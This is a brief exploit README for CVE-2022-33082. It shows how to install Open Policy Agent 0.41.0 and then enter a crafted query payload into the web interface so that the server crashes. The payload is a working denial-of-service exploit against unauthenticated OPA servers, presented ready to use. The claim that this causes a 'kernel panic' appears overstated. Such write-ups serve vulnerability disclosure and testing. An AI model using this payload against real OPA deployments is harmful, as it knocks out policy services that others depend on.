# CVE 2022-33082 Exploit

### This exploit works on Open Policy Agent (OPA) versions 0.41.0 and lower. Install an OPA instance on Linux to test with this command:
`
curl -L -o opa https://openpolicyagent.org/downloads/v0.41.0/opa_linux_amd64_static
chmod +x opa
./opa run --server
`
### Then, navigate to localhost:8181 on your web browser. Input the below into the respective fields
` 
//query field (go code)
p := [input() | input := 1]
`

`
//input data (json) field (json - just random json to get it to execute)

{
  "input":"blah blah blah rainbows and unicorns"
}
`
### The website will then crash and the terminal runing the server will report a kernel panic

## Implications
### Anyone with web access to an OPA server version 0.41.0 or lower can completely crash the server. This server is not password protected by default.
